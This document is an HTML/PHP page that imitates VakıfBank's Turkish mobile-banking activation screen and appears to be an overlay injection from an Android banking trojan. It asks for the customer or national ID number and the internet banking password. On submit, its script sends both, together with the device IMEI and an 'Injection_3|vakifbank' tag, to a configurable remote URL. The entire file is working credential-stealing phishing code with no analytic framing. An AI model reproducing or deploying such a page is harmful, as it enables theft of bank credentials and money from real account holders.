<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.vakifbank.mobile/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<div class="header">
	<img style="float: left;width: 14px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAApCAMAAADphEJPAAABaFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+5YjZ9AAAAd3RSTlMAAZpol/5lk6OQqAOOqomsBYWvBoGzf7Z7uAd3uglzvQpwwG7CC2rEDWbHD2PKYf3MEF78zhJZ0BRW0xWt1xq13B9n+eAkTPjlKUX16S8+8u00OO/wOzLr9EEs5/ZIJ+NQId/6WB3ZXxjVcRHIeQ6Eu4wItGCkYivrzs0AAAEKSURBVCjPbdNVW0JRFIThg3JExUCPnYjYgQoqKiZ2dyt2d83fd+5n7cv3e/bFjuU4unxZ2Y7Ffrg5BgcA5KrnkfODwgXkQuUicnFIuIRc6gmXkcuVK8iVylXk6hrhWnJdvXADuTEs3ESOKDe7QLRFuJXc1i7cQe7sEu4m9yj3xoC+fuGBOJAYFB4iDyeFR8ijY/o8KZ5nfELdm2SYmjbCTBqYnTM+xvwCsLhkhOUVYHXNCOsbwOaWEbZ3gN09I+wfAIdHRjg+AU7PjHCeAdIXRri8Aq5vjHB7B8TvjfDwCLjWTCQTDE9GeH7hLb4a4S3K8G6E8AfDp0/D1zdDwNjhpRD7sQY1+Pvn/AMErEmLZNCLPAAAAABJRU5ErkJggg==">
	<h4> Mobil Bankacılık Aktivasyon </h4>
	<img style="float: right; width: 24px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAwCAMAAABkKdmIAAAA+VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9BnGuhAAAAUnRSTlMAA5CqqQTl5uoqK6vwMDEF8Tc48vU/QPlHrPpPUPsG/Fj+YWKtbG10da6AgYuMr5QBlbCen6ixsuGz0EzVFdZauacbmrteTkhElreZSyKkj8y40H1eMwAAAWBJREFUSMft1m1TgkAQB/BDxSgte7DUHlYps+zByEpNI8tK00xrv/+HacnsDgQ8mpreuG+4/e/9hhngZmDs10oJhZSAIowYCWRUEohhJZiIzpFRgwhtfkGTN2oMMb7I2FJc1iRILK9Yq9U1xJgqJ5Lro/VGkkxCRqTS4y6dmm4SGcTNLd5v7yBmfA2QyObEJJf1N5bQd+3Znk4GPEWexL4zLaC3sQQeTOaHFOddDRRpdOQ2OaZBETzEifv9T10NlCg+M9yJce5ioEzhheH1YIxLGpdgQlz5HA8lQhvK4BBl8H3JFduWz1YD/08JNMFA1Tq1tWkfbM3aVQEuJAlWycA1LepypD4yDbrcmHLEvKXNDcaad/ctJkdY6+Hxadxz0i50noXqFNoCEYuTLjqq+0ek9/JdPUnS53l/RmbkP0n0dVQDJxl8DaIOoosnxE546TYyfOP1bvLc7AmD4Y9/oj4AZnGtwYoyWm0AAAAASUVORK5CYII=">
</div>

	<form method="post">

		<div class="field">
			<input type="text" name="fields[login]" class="input" id="login" placeholder="">
			<label for="login">Müşteri / T.C. Kimlik Numarası</label>
		</div>

		<div class="field">
			<input type="password" name="fields[password]" class="input" id="password" placeholder="">
			<label for="password">İnternet Bankacılığı Şifresi </label>
		</div>

		<input type="hidden" name="fields[type]" value="persxxxx_acc" />

		<div class="field">
			<input type="submit" class="button" id="input_submitBtn" value="Devam">
		</div>
	</form>

</div>

<script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|vakifbank|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>


</body>
</html>
